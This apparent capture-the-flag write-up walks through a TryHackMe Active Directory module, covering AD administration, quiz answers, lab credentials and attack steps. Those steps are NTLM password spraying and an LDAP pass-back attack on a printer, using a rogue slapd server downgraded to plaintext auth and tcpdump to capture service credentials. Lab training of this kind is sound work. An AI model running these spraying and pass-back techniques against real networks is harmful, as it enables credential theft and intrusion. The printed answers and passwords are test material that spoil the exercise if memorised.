# Active Directory [TryHackMe Module]

<sup>This write-up covers the entire module of Active Directory, that can be found in the learning paths _Offensive Pentest_ and _Red Teaming_. This module is a walkthrough, I will explore it as much as possible.</sup>

## Active Directory Basics

First let's log into the machine via `xfreerdp`:

```shell
xfreerdp /u:Administrator@THM /p:Password321 /v:10.10.185.134 /cert:ignore +clipboard
```

- In a Windows domain, credentials are stored in a centralised repository called...
- __Active Directory__

- The server in charge of running the Active Directory services is called...
- __Domain Controller__

- Which group normally administrates all computers and resources in a domain?
- __Domain Admins__

- What would be the name of the machine account associated with a machine named TOM-PC?
- __TOM-PC$__

- Suppose our company creates a new department for Quality Assurance. What type of containers should we use to group all Quality Assurance users so that policies can be applied consistently to them?
- __Organizational Units__

Let's open the search in the Windows machine and type _Active Directory Users and Computers_. Open it.

We have to remove the Research and Development OU as per the chart given to us, so go to the __View__ dropdown, then __Advanced Features__, right click the Research and Development OU in the tree to the left, click __Properties__.

You should see __Object__ tab and when you go to it, uncheck the `Protect object from accidental deletion` checkbox. Click OK to save settings and try deleting again. 

Now let's see which users don't match with our organizational chart. Sales department seems to crowded as there are two extra employees, that aren't in the chart: Christine and Robert. Let's delete them too. 

The control of Sales OU should be delegated to Phillip in the IT. Right click Sales OU and click __Delegate Control__, press `Next` in the wizard and type `Phillip` in the prompt for names. Once it finds it click `Next` again. In the tasks list, check only `Reset user passwords and force password change at next logon`. Then `Next` and `Finish`. 

Now let's use Phillip's account to try and reset Sophie's password:

```shell
xfreerdp /u:Phillip@THM /p:Claire2008 /v:10.10.185.134 /cert:ignore +clipboard
```

Once we're in, to reset Sophie's password to the one of our choice open PowerShell and type the following:

```powershell
Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
```

I chose `Pass!@#$1234` as Sophie's new password. Now we need to force the user to change password at logon:

```powershell
Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
```

Now let's log in as Sophie's user with new password:

```shell
xfreerdp /u:Sophie@THM /p:"Pass!@#$1234" /v:10.10.185.134 /cert:ignore +clipboard
```

Change the password and capture the flag!

- The process of granting privileges to a user over some OU or other AD Object is called...
- __Delegation__

This time we are going to organize computers so, let's go back to the administrator account via `xfreerdp`. Navigate back to Active Directory Users and Computers, right click `thm.local` in the tree, then __New__ and __Organizational Unit__. Name the unit Workstation and do it again for Servers. From Computers OU drag and drop Laptops and Computers to Workstations OU and Servers to Servers OU. 

- After organising the available computers, how many ended up in the Workstations OU? 
- __7__

- Is it recommendable to create separate OUs for Servers and Workstations? (yay/nay)
- __yay__

Now let's log back into the machine as Administrator user. Search for and navigate to __Group Policy Management__ through Start menu. Create a new GPO called "Restrict Control Panel Access". Open it for editing and under _User Configuration_ --> _Policies_ -->  _Administrative Templates_ --> _Control Panel_ find __Prohibit Access to Control Panel and PC Settings__. Double click it and enable it. 

Now we can link this GPO to OUs. Just drag and drop the GPO to all OUs under THM that aren't IT. 

Now let's create a new GPO and name it "Auto Lock Screen", edit it in the same way only look into _Computer Configuration_ --> _Policies_ --> _Windows Settings_ --> _Security Settings_ --> _Local Policies_ --> _Security Options_ and choose __Interactive logon: Machine inactivity limit__.

Set the limit to 5 minutes (or 300 seconds) and apply this policy to the entire domain `thm.local` by dragging it right under it in the tree. 

Now we can log into the machine as user Mark and check if both policies work:

```shell
xfreerdp /u:Mark@THM /p:"M4rk3t1ng.21" /v:10.10.35.36 /cert:ignore +clipboard
```

- What is the name of the network share used to distribute GPOs to domain machines?
- __sysvol__

- Can a GPO be used to apply settings to users and computers? (yay/nay)
- __yay__

- Will a current version of Windows use NetNTLM as the preferred authentication protocol by default? (yay/nay)
- __nay__

- When referring to Kerberos, what type of ticket allows us to request further tickets known as TGS?
- __Ticket Granting Ticket__

- When using NetNTLM, is a user's password transmitted over the network at any point? (yay/nay)
- __nay__

- What is a group of Windows domains that share the same namespace called?
- __Tree__

- What should be configured between two domains for a user in Domain A to access a resource in Domain B?
- __A Trust Relationship__

## Breaching Active Directory

Download the `openvpn` configuration file from the access page and run it:

```shell
sudo openvpn --config breachingad.ovpn
```

### Configure DNS

First, let's start the VPN for this network in the background (mine's name was `breachingad.ovpn`):

```shell
sudo nohup openvpn --config breachingad.ovpn > /dev/null 2>&1 &
```

Then let's configure DNS for this connection specifically:

```
└─$ nmcli connection show
NAME                UUID                                  TYPE      DEVICE
Wired connection 1  da0d3c10-0411-4b35-ac3a-8e1dddab43a6  ethernet  eth1
breachad            2ef21389-d21b-41e8-868f-7893f446ee65  tun       breachad
```

This `breachad` connection is what we need to configure DNS for:

```
sudo nmcli connection modify "breachad" ipv4.dns "10.200.9.101 1.1.1.1"
``` 

The first DNS server `10.200.9.101` is the IPv4 address of the Domain Controller (THMDC) on this network. The second DNS server address `1.1.1.1` is cloudflare DNS for the purposes of having internet on this machine.

```
sudo nmcli connection modify "breachad" ipv4.ignore-auto-dns yes
```

The purpose of the above command is to not overwrite DNS we gave this connection with automatic configuration of DNS addresses. Now let's turn the connection on:

```
sudo nmcli connection up "breachad"
```

Now let's verify our DNS configuration for this connection is correct:

```
nmcli dev show breachad | grep DNS
```

If the output is this:

```
IP4.DNS[1]:                             10.200.9.101
IP4.DNS[2]:                             1.1.1.1
```

We should be good to go. 

Here's a [script](https://github.com/gremlin-0x/AD_module_dns_config) that does this more reliably and is supposed to work with next rooms as well.

- What popular website can be used to verify if your email address or password has ever been exposed in a publicly disclosed data breach?
- __haveibeenpwnd__

Download and unzip the file tasks:

```shell
unzip passwordsprayer-1111222233334444.zip
```

The usage of a password sprayer script provided in these files is the following as per instruction:

```shell
python3 ntlm_passwordspray.py -u usernames.txt -p "Changeme123" -f "za.tryhackme.com" -a "http://ntlmauth.za.tryhackme.com"
```

This renders the following valid credential pairs:

```
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
```

- What is the name of the challenge-response authentication mechanism that uses NTLM?
- __NetNTLM__

- What is the username of the third valid credential pair found by the password spraying script?
- __gordon.stevens__

- How many valid credentials pairs were found by the password spraying script?
- __4__

- What is the message displayed by the web application when authenticating with a valid credential pair?
- __Hello World__

Now we will practice LDAP pass-back attacks on a printer connected to this network `printer.za.tryhackme.com`:

```shell
firefox http://printer.za.tryhackme.com/settings.aspx
``` 

We don't have the password for this one, however upon testing settings, its still sending request to the IP specified. We can input our IP of the VPN interface `breachad` and see what happens:

```shell
ip a | grep breachad
nc -lvnp 339
```

Here's the output:

```
listening on [any] 339 ...
connect to [10.50.8.21] from (UNKNOWN) [10.200.9.201] 49804
0Dc;

x
 objectclass0supportedCapabilities
```

Let's move on to hosting a rogue LDAP server on our machine, to make use of this vulnerability:

```shell
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
```

To downgrade our LDAP server's security, we need to create an `olcSaslSecProps.ldif` file with the following contents:

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties:
    - olcSaslSecProps: Specifies the SASL security properties
    - noanonymous: Disables mechanisms that support anonymous login
    - minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

Now let's use it to patch the LDAP server:

```shell
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

To test our configuration:

```shell
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

The output should be:

```
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

So let's repeat the following sequence and fill in the test settings for the printer:

```shell
ip a | grep breachad
nc -lvnp 339
firefox http://printer.za.tryhackme.com/settings.aspx
```

Fill in the creds and then:

```
sudo tcpdump -SX -i breachad tcp port 389
```

The result:

```
12:23:11.951296 IP 10.200.9.201.54858 > kali.ldap: Flags [P.], seq 2832526348:2832526413, ack 3299128608, win 1027, length 65
        0x0000:  4500 0069 72ca 4000 7f06 61ed 0ac8 09c9  E..ir.@...a.....
        0x0010:  0a32 0815 d64a 0185 a8d4 ec0c c4a4 b520  .2...J..........
        0x0020:  5018 0403 cc9d 0000 3084 0000 003b 0201  P.......0....;..
        0x0030:  0760 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
        0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
        0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..{*********
        0x0060:  6461 7070 6173 7331 40                   ********}
12:23:11.951319 IP kali.ldap > 10.200.9.201.54858: Flags [.], ack 2832526413, win 502, length 0
```


